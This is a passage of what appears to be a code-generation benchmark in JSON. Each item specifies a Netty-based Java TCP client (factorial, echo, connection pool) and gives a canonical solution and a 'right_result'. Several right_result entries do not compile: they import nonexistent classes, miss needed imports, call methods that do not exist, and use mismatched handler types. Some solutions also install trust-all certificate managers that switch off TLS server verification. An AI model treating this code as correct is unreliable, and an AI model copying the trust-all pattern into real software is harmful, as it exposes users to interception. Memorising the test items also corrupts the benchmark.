lastWriteFuture = null;\n        BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n        for (;;) {\n            String line = in.readLine();\n            if (line == null) {\n                break;\n            }\n\n            lastWriteFuture = channel.writeAndFlush(line + \"\\r\\n\");\n\n            if (\"bye\".equals(line.toLowerCase())) {\n                channel.closeFuture().sync();\n                break;\n            }\n        }\n\n        if (lastWriteFuture != null) {\n            lastWriteFuture.sync();\n        }\n    }\n\n    public void shutdown() {\n        group.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.SimpleChannelInboundHandler;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.concurrent.TimeUnit;\n\npublic class SecureChatClient {\n    private String HOST = \"127.0.0.1\";\n    private int PORT = 8992;\n    private EventLoopGroup group;\n    private Channel channel;\n    private SslContext sslCtx;\n\n    public SecureChatClient() {\n        this.group = new NioEventLoopGroup();\n        this.sslCtx = SslContextBuilder.forClient().build();\n    }\n\n    public void connect() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(sslCtx.newHandler(ch.alloc()));\n                        pipeline.addLast(new SimpleChannelInboundHandler<String>() {\n                            @Override\n                            protected void channelRead0(ChannelHandlerContext ctx, String msg) {\n                                System.out.println(\"Server: \" + msg);\n                            }\n                        });\n                    }\n                });\n        ChannelFuture future = bootstrap.connect(HOST, PORT).sync();\n        this.channel = future.channel();\n    }\n\n    public void startChat() {\n        new Thread(() -> {\n            try {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    if (line.equalsIgnoreCase(\"exit\")) {\n                        break;\n                    }\n                    channel.writeAndFlush(Unpooled.copiedBuffer(line.getBytes()));\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }).start();\n    }\n\n    public void shutdown() {\n        try {\n            channel.closeFuture().await(1, TimeUnit.SECONDS);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 120,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a server, calculate factorials, and handle secure connections when required.\n\nClass Description: The FactorialClient class establishes a TCP connection to a specified server using Netty's non-blocking I/O. It supports optional SSL encryption and calculates factorials through server communication. The class manages connection lifecycle and resource cleanup.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server (default: 8322)\n- COUNT: int - The number for which factorial should be calculated (default: 1000)\n\nMethods:\n- start(): void - Initializes the Netty client, establishes connection, handles SSL if enabled, and calculates factorial. Throws Exception if any error occurs during the process.\n  - Input: None\n  - Output: None (prints factorial result to stderr)\n  - Description: Creates event loop group, configures bootstrap with channel type and handler, connects to server, retrieves factorial result from handler, and ensures proper resource cleanup.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class FactorialClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n    static final int COUNT = Integer.parseInt(System.getProperty(\"count\", \"1000\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx = SSL ? SslContext.newClientContext(InsecureTrustManagerFactory.INSTANCE) : null;\n        EventLoopGroup group = new NioEventLoopGroup();\n        \n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new FactorialClientInitializer(sslCtx));\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n            FactorialClientHandler handler = (FactorialClientHandler) f.channel().pipeline().last();\n            System.err.format(\"Factorial of %,d is: %,d\", COUNT, handler.getFactorial());\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;  \nimport io.netty.channel.Channel;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelHandler;  \nimport io.netty.channel.ChannelInitializer;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.nio.NioEventLoopGroup;  \nimport io.netty.channel.socket.SocketChannel;  \nimport io.netty.channel.socket.nio.NioSocketChannel;  \nimport io.netty.handler.codec.string.StringDecoder;  \nimport io.netty.handler.codec.string.StringEncoder;  \nimport io.netty.handler.ssl.SslContext;  \nimport io.netty.handler.ssl.SslHandler;  \nimport io.netty.handler.ssl.TrustManager;  \nimport io.netty.handler.ssl.X509TrustManager;  \nimport io.netty.handler.logging.LoggingHandler;  \nimport io.netty.buffer.ByteBuf;  \nimport io.netty.buffer.Unpooled;  \nimport io.netty.channel.ChannelHandlerContext;  \nimport io.netty.channel.SimpleChannelInboundHandler;  \nimport io.netty.util.CharsetUtil;  \nimport java.security.cert.X509Certificate;  \n\npublic class FactorialClient {  \n    private boolean ssl;  \n    private String host = \"127.0.0.1\";  \n    private int port = 8322;  \n    private int count = 1000;  \n\n    public FactorialClient(boolean ssl) {  \n        this.ssl = ssl;  \n    }  \n\n    public FactorialClient(String host, int port, int count) {  \n        this.host = host;  \n        this.port = port;  \n        this.count = count;  \n    }  \n\n    public void start() throws Exception {  \n        EventLoopGroup group = new NioEventLoopGroup();  \n        try {  \n            Bootstrap bootstrap = new Bootstrap();  \n            bootstrap.group(group)  \n                     .channel(NioSocketChannel.class)  \n                     .handler(new ChannelInitializer<SocketChannel>() {  \n                         @Override  \n                         protected void initChannel(SocketChannel ch) throws Exception {  \n                             ch.pipeline().addLast(new StringEncoder());  \n                             ch.pipeline().addLast(new StringDecoder());  \n                             ch.pipeline().addLast(new ClientHandler());  \n                         }  \n                     });  \n\n            if (ssl) {  \n                TrustManager[] trustAllCerts = new TrustManager[] {  \n                    new X509TrustManager() {  \n                        public void checkClientTrusted(X509Certificate[] chain, String authType) {}  \n                        public void checkServerTrusted(X509Certificate[] chain, String authType) {}  \n                        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }  \n                    }  \n                };  \n\n                SslContext sslCtx = SslContext.newClientContext(trustAllCerts, null);  \n                bootstrap.pipeline().addFirst(sslCtx);  \n            }  \n\n            ChannelFuture future = bootstrap.connect(host, port).sync();  \n            future.channel().writeAndFlush(Unpooled.copiedBuffer(String.valueOf(count), CharsetUtil.UTF_8));  \n            future.channel().closeFuture().sync();  \n        } finally {  \n            group.shutdownGracefully();  \n        }  \n    }  \n\n    private static class ClientHandler extends SimpleChannelInboundHandler<String> {  \n        @Override  \n        protected void channelRead0(ChannelHandlerContext ctx, String msg) {  \n            System.err.println(\"Factorial result: \" + msg);  \n            ctx.close();  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 122,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for establishing non-blocking network connections, sending messages to a server, and handling console input.\n\nClass Description: The EchoClient class provides functionality to connect to a TCP server, send messages, read console input, and gracefully shutdown the connection. It uses Netty's non-blocking I/O model for efficient network communication.\n\nAttributes:\n- hostName: [String] - The hostname or IP address of the server to connect to\n- portNumber: [int] - The port number of the server to connect to\n- group: [EventLoopGroup] - Netty event loop group for managing I/O threads\n- channel: [Channel] - The active network channel for communication with the server\n\nMethods:\n- connect(): [void]() -> [void] - Initializes the Netty client, connects to the specified server, and sets up the communication pipeline\n- sendMessage(): [void]([String message]) -> [void] - Converts the input string to a ByteBuf and sends it to the server through the established channel\n- startConsoleInput(): [void]() -> [void] - Starts reading input from the console and sends each line to the server (throws IOException)\n- shutdown(): [void]() -> [void] - Gracefully shuts down the client connection and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\n\npublic final class EchoClient {\n\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.TCP_NODELAY, true)\n         .handler(new EchoClientChannelInitializer());\n\n        ChannelFuture f = b.connect(hostName, portNumber).sync();\n        channel = f.channel();\n    }\n\n    public void sendMessage(String message) {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        ByteBuf buf = Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(buf);\n        writeBuffer.clear();\n    }\n\n    public void startConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + hostName);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + hostName);\n            System.exit(1);\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;  \nimport io.netty.channel.Channel;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelHandler;  \nimport io.netty.channel.ChannelInitializer;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.nio.NioEventLoopGroup;  \nimport io.netty.channel.socket.SocketChannel;  \nimport io.netty.channel.socket.nio.NioSocketChannel;  \nimport io.netty.handler.codec.string.StringDecoder;  \nimport io.netty.handler.codec.string.StringEncoder;  \nimport io.netty.handler.codec.linebased.LineBasedFrameDecoder;  \nimport io.netty.buffer.Unpooled;  \nimport io.netty.util.CharsetUtil;  \nimport java.io.BufferedReader;  \nimport java.io.IOException;  \nimport java.io.InputStreamReader;  \n\npublic class EchoClient {  \n    private String hostName;  \n    private int portNumber;  \n    private EventLoopGroup group;  \n    private Channel channel;  \n\n    public EchoClient(String hostName, int portNumber) {  \n        this.hostName = hostName;  \n        this.portNumber = portNumber;  \n        this.group = new NioEventLoopGroup();  \n    }  \n\n    public void connect() {  \n        Bootstrap bootstrap = new Bootstrap();  \n        bootstrap.group(group)  \n                .channel(NioSocketChannel.class)  \n                .handler(new ChannelInitializer<SocketChannel>() {  \n                    @Override  \n                    protected void initChannel(SocketChannel ch) throws Exception {  \n                        ch.pipeline().addLast(new LineBasedFrameDecoder(8192));  \n                        ch.pipeline().addLast(new EchoClientHandler());  \n                    }  \n                });  \n        channel = bootstrap.connect(hostName, portNumber).sync().channel();  \n    }  \n\n    public void sendMessage(String message) {  \n        if (channel != null && channel.isActive()) {  \n            ByteBuf buf = Unpooled.copiedBuffer(message, CharsetUtil.UTF_8);  \n            channel.writeAndFlush(buf).addListener((ChannelFutureListener) future -> {  \n                if (!future.isSuccess()) {  \n                    System.err.println(\"Failed to send message: \" + future.cause());  \n                }  \n            });  \n        }  \n    }  \n\n    public void startConsoleInput() throws IOException {  \n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));  \n        String line;  \n        while ((line = reader.readLine()) != null) {  \n            sendMessage(line);  \n        }  \n    }  \n\n    public void shutdown() {  \n        if (channel != null) {  \n            channel.close().awaitUninterruptibly();  \n        }  \n        group.shutdownGracefully();  \n    }  \n\n    private static class EchoClientHandler extends io.netty.handler.codec.string.StringDecoder {  \n        @Override  \n        public void channelReadComplete(ChannelHandlerContext ctx) {  \n            ctx.flush();  \n        }  \n\n        @Override  \n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {  \n            cause.printStackTrace();  \n            ctx.close();  \n        }  \n    }  \n}"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, error handling, and resource cleanup.\n\nClass Description: NetService is a connection management class that maintains and reuses TCP connections to remote locations using Netty's non-blocking I/O. It provides thread-safe connection pooling and handles connection lifecycle including handshake, authentication, and graceful shutdown.\n\nAttributes:\n- connections: ConcurrentHashMap<Location, Connection> - Thread-safe map storing active connections keyed by remote location\n\nMethods:\n- connect(Location location) -> Connection - Establishes or reuses a TCP connection to the specified location. Handles connection initialization, handshake, and authentication. Returns the established connection.\n  Input: \n    - location: Location - The remote endpoint to connect to\n  Output: \n    - Connection - The established or existing connection object\n\nThe implementation should:\n1. Use Netty's Bootstrap for client configuration\n2. Employ NioEventLoopGroup for I/O thread management\n3. Configure TCP_NODELAY for low-latency communication\n4. Handle connection errors and interruptions\n5. Implement connection pooling with automatic cleanup\n6. Support connection handshake and authentication\n7. Provide graceful shutdown of resources\n8. Maintain thread safety through ConcurrentHashMap",
    "Canonical_solution": "import io.dingodb.common.Location;\nimport io.dingodb.net.NetError;\nimport io.dingodb.net.netty.Constant;\nimport io.dingodb.net.netty.connection.Connection;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport static io.dingodb.common.concurrent.Executors.executor;\nimport static io.dingodb.common.util.Optional.ifPresent;\n\n@Slf4j\npublic class NetService {\n\n    private final Map<Location, Connection> connections = new ConcurrentHashMap<>(8);\n\n    private Connection connect(Location location) {\n        return connections.computeIfAbsent(location, k -> {\n            Optional<Connection> connection = Optional.empty();\n            NioEventLoopGroup executor = new NioEventLoopGroup(0, executor(location.url() + \"/connection\"));\n            try {\n                Bootstrap bootstrap = new Bootstrap();\n                bootstrap\n                    .channel(NioSocketChannel.class)\n                    .group(executor)\n                    .option(ChannelOption.TCP_NODELAY, true)\n                    .remoteAddress(location.toSocketAddress())\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            connection.ifAbsentSet(new Connection(Constant.CLIENT, location, ch));\n                            NettyHandlers.initChannelPipeline(ch, connection.get());\n                        }\n                    });\n                bootstrap.connect().sync().await();\n                connection\n                    .ifPresent(Connection::handshake).ifPresent(Connection::auth)\n                    .ifPresent(() -> log.info(\"Connection open, remote: [{}].\", location))\n                    .orElseThrow(() -> new NullPointerException(\"connection\"));\n            } catch (InterruptedException e) {\n                log.error(\"Open connection to [{}] interrupted.\", location, e);\n                connection.ifPresent(Connection::close);\n                executor.shutdownGracefully();\n                NetError.OPEN_CONNECTION_INTERRUPT.throwFormatError(location);\n            } catch (Exception e) {\n                log.error(\"Open connection to [{}] error.\", location, e);\n                connection.ifPresent(Connection::close);\n                executor.shutdownGracefully();\n                throw e;\n            }\n            connection.get().addCloseListener(__ -> executor.shutdownGracefully());\n            connection.ifPresent(__ -> __.addCloseListener(___ -> connections.remove(location, __)));\n            connection.ifPresent(__ -> __.socket().closeFuture().addListener(ignore -> __.close()));\n            return connection.get();\n        });\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;  \nimport io.netty.channel.Channel;  \nimport io.netty.channel.ChannelFuture;  \nimport io.netty.channel.ChannelOption;  \nimport io.netty.channel.EventLoopGroup;  \nimport io.netty.channel.nio.NioEventLoopGroup;  \nimport io.netty.channel.socket.nio.NioSocketChannel;  \nimport io.netty.handler.codec.string.StringDecoder;  \nimport io.netty.handler.codec.string.StringEncoder;  \nimport java.net.InetSocketAddress;  \nimport java.util.concurrent.ConcurrentHashMap;  \nimport java.util.concurrent.TimeUnit;  \n\npublic class NetService {  \n    public static class Connection {  \n        private final Channel channel;  \n\n        public Connection(Channel channel) {  \n            this.channel = channel;  \n        }  \n\n        public boolean isActive() {  \n            return channel.isOpen();  \n        }  \n\n        public void close() {  \n            channel.close();  \n        }  \n    }  \n\n    private final EventLoopGroup eventLoopGroup = new NioEventLoopGroup();  \n    private final Bootstrap bootstrap;  \n    private final ConcurrentHashMap<Location, Connection> connections = new ConcurrentHashMap<>();  \n\n    public NetService() {  \n        bootstrap = new Bootstrap();  \n        bootstrap.group(eventLoopGroup);  \n        bootstrap.option(ChannelOption.TCP_NODELAY, true);  \n        bootstrap.channel(NioSocketChannel.class);  \n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {  \n            @Override  \n            protected void initChannel(SocketChannel ch) throws Exception {  \n                ch.pipeline().addLast(new StringDecoder());  \n                ch.pipeline().addLast(new StringEncoder());  \n                // Add custom handshake/authentication handlers here  \n            }  \n        });  \n    }  \n\n    public Connection connect(Location location) {  \n        Connection existing = connections.get(location);  \n        if (existing != null && existing.isActive()) {  \n            return existing;  \n        }  \n\n        try {  \n            SocketAddress remoteAddress = new InetSocketAddress(location.getHost(), location.getPort());  \n            ChannelFuture future = bootstrap.connect(remoteAddress).sync();  \n            Channel channel = future.channel();  \n            connections.put(location, new Connection(channel));  \n            return new Connection(channel);  \n        } catch (Exception e) {  \n            if (existing != null) {  \n                existing.close();  \n            }  \n            throw new RuntimeException(\"Failed to connect to \" + location, e);  \n        }  \n    }  \n\n    public void shutdown() {  \n        connections.values().forEach(Connection::close);  \n        eventLoopGroup.shutdownGracefully();  \n    }  \n}"
  },
  {
    "Task_id": 126,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a server, send requests, and receive responses, with optional SSL support.\n\nClass Description: FactorialClient is a Netty-based TCP client that connects to a server to calculate factorials. It handles SSL configuration, connection management, and graceful shutdown of resources.\n\nAttributes:\n- SSL: boolean - Flag indicating whether SSL encryption should be used\n- HOST: String - The host address of the server to connect to (default: \"127.0.0.1\")\n- PORT: int - The port number of the server (default: 8322)\n- COUNT: int - The number for which factorial should be calculated (default: 1000)\n\nMethods:\n- start(): void - Initializes and starts the Netty client. Configures SSL if enabled, establishes connection to server, and handles the factorial calculation request. Throws Exception if any error occurs during the process.\n  - Input: None\n  - Output: None (prints result to System.err)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\n\npublic final class FactorialClient {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"8322\"));\n    static final int COUNT = Integer.parseInt(System.getProperty(\"count\", \"1000\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            sslCtx = SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new FactorialClientInitializer(sslCtx));\n\n            ChannelFuture f = b.connect(HOST, PORT).sync();\n\n            FactorialClientHandler handler =\n                (FactorialClientHandler) f.channel().pipeline().last();\n\n            System.err.format(\"Factorial of %,d is: %,d\", COUNT, handler.getFactorial());\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap; import io.netty.channel.Channel; import io.netty.channel.ChannelFuture; import io.netty.channel.ChannelHandlerContext; import io.netty.channel.ChannelInboundHandlerAdapter; import io.netty.channel.EventLoopGroup; import io.netty.channel.nio.NioEventLoopGroup; import io.netty.channel.socket.nio.NioSocketChannel; import io.netty.handler.codec.string.StringDecoder; import io.netty.handler.codec.string.StringEncoder; import io.netty.util.CharsetUtil; import io.netty.buffer.Unpooled; import javax.net.ssl.SSLEngine; import javax.net.ssl.SSLContext; import javax.net.ssl.TrustManager; import javax.net.ssl.X509TrustManager; import java.security.SecureRandom; import java.util.concurrent.TimeUnit; public class FactorialClient { private boolean ssl; private String host = \"127.0.0.1\"; private int port = 8322; private int count = 1000; private SSLContext sslContext; public FactorialClient(boolean ssl) { this.ssl = ssl; if (ssl) { try { TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() { public void checkClientTrusted(X509Certificate[] chain, String authType) {} public void checkServerTrusted(X509Certificate[] chain, String authType) {} public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; } }}; sslContext = SSLContext.getInstance(\"TLS\"); sslContext.init(null, trustAllCerts, new SecureRandom()); } catch (Exception e) { throw new RuntimeException(\"Failed to create SSL context\", e); } } else { sslContext = null; } } public void start() throws Exception { EventLoopGroup group = new NioEventLoopGroup(); try { Bootstrap bootstrap = new Bootstrap(); bootstrap.group(group) .channel(NioSocketChannel.class) .handler(new ChannelInitializer<Channel>() { @Override protected void initChannel(Channel ch) throws Exception { ChannelPipeline pipeline = ch.pipeline(); if (ssl) { pipeline.addLast(new SslHandler(sslContext)); } pipeline.addLast(new StringEncoder()); pipeline.addLast(new StringDecoder()); pipeline.addLast(new ClientHandler()); } }); ChannelFuture future = bootstrap.connect(host, port).sync(); future.channel().closeFuture().sync(); } finally { group.shutdownGracefully(); } } private class ClientHandler extends ChannelInboundHandlerAdapter { @Override public void channelActive(ChannelHandlerContext ctx) { String request = Integer.toString(count); ctx.writeAndFlush(Unpooled.copiedBuffer(request.getBytes(CharsetUtil.UTF_8))); } @Override public void channelRead(ChannelHandlerContext ctx, Object msg) { String response = (String) msg; System.err.println(\"Factorial result: \" + response); ctx.close(); } @Override public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) { cause.printStackTrace(); ctx.close(); } } }"
  },
  {
    "Task_id": 129,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish non-blocking connections, send messages to a server, and handle graceful shutdown.\n\nClass Description: The EchoClient class provides functionality to connect to a TCP server, send messages, and manage client resources. It uses Netty's non-blocking I/O for efficient communication.\n\nAttributes:\n- hostName: [String] - The hostname or IP address of the server to connect to\n- portNumber: [int] - The port number of the server to connect to\n- group: [EventLoopGroup] - Netty event loop group for managing I/O threads\n- channel: [Channel] - The active network channel for communication with the server\n\nMethods:\n- connect(): [void] - Establishes a connection to the specified server using Netty's Bootstrap. Initializes the event loop group and configures the client pipeline.\n- sendMessage(message: [String]): [void] - Converts the input string to a ByteBuf and sends it to the connected server through the active channel.\n- startConsoleInput(): [void] - Reads input from the console and sends it to the server line by line until terminated. Handles IO exceptions.\n- shutdown(): [void] - Gracefully shuts down the event loop group and releases all resources. Should be called when the client is no longer needed.",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.buffer.Unpooled;\n\npublic final class EchoClient {\n\n    private final String hostName;\n    private final int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n    }\n\n    public void connect() throws InterruptedException {\n        group = new NioEventLoopGroup();\n        Bootstrap b = new Bootstrap();\n        b.group(group)\n         .channel(NioSocketChannel.class)\n         .option(ChannelOption.TCP_NODELAY, true)\n         .handler(new EchoClientHandler());\n\n        ChannelFuture f = b.connect(hostName, portNumber).sync();\n        channel = f.channel();\n    }\n\n    public void sendMessage(String message) {\n        ByteBuffer writeBuffer = ByteBuffer.allocate(32);\n        writeBuffer.put(message.getBytes());\n        writeBuffer.flip();\n        writeBuffer.rewind();\n        \n        ByteBuf buf = Unpooled.copiedBuffer(writeBuffer);\n        channel.writeAndFlush(buf);\n        writeBuffer.clear();\n    }\n\n    public void startConsoleInput() throws IOException {\n        try (BufferedReader stdIn = new BufferedReader(new InputStreamReader(System.in))) {\n            String userInput;\n            while ((userInput = stdIn.readLine()) != null) {\n                sendMessage(userInput);\n            }\n        } catch (UnknownHostException e) {\n            System.err.println(\"\u4e0d\u660e\u4e3b\u673a\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a \" + hostName);\n            System.exit(1);\n        } catch (IOException e) {\n            System.err.println(\"\u4e0d\u80fd\u4ece\u4e3b\u673a\u4e2d\u83b7\u53d6I/O\uff0c\u4e3b\u673a\u540d\u4e3a\uff1a\" + hostName);\n            System.exit(1);\n        }\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "right_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.buffer.Unpooled;\nimport java.nio.charset.StandardCharsets;\nimport java.util.Scanner;\n\npublic class EchoClient {\n    private String hostName;\n    private int portNumber;\n    private EventLoopGroup group;\n    private Channel channel;\n\n    public EchoClient(String hostName, int portNumber) {\n        this.hostName = hostName;\n        this.portNumber = portNumber;\n        this.group = new NioEventLoopGroup();\n    }\n\n    public void connect() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group);\n        bootstrap.channel(NioSocketChannel.class);\n        bootstrap.handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(SocketChannel ch) throws Exception {\n                ChannelPipeline pipeline = ch.pipeline();\n                pipeline.addLast(new StringEncoder());\n                pipeline.addLast(new StringDecoder());\n                pipeline.addLast(new EchoClientHandler());\n            }\n        });\n        ChannelFuture future = bootstrap.connect(hostName, portNumber).sync();\n        channel = future.channel();\n    }\n\n    public void sendMessage(String message) {\n        if (channel != null && channel.isActive()) {\n            ByteBuf buf = Unpooled.copiedBuffer(message.getBytes(StandardCharsets.UTF_8));\n            channel.writeAndFlush(buf).addListener((ChannelFutureListener) future -> {\n                if (!future.isSuccess()) {\n                    // Handle error\n                }\n            });\n        }\n    }\n\n    public void startConsoleInput() {\n        new Thread(() -> {\n            Scanner scanner = new Scanner(System.in);\n            while (true) {\n                System.out.print(\"Enter message to send (or 'exit' to quit): \");\n                String line = scanner.nextLine();\n                if (line.equalsIgnoreCase(\"exit\")) {\n                    break;\n                }\n                sendMessage(line);\n            }\n            shutdown();\n        }).start();\n    }\n\n    public void shutdown() {\n        if (group != null) {\n            group.shutdownGracefully();\n        }\n        if (channel != null) {\n            channel.closeFuture().syncUninterruptibly();\n        }\n    }\n\n    static class EchoClientHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            System.out.println(\"Received: \" + msg);\n            ctx.fireChannelRead(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 13,
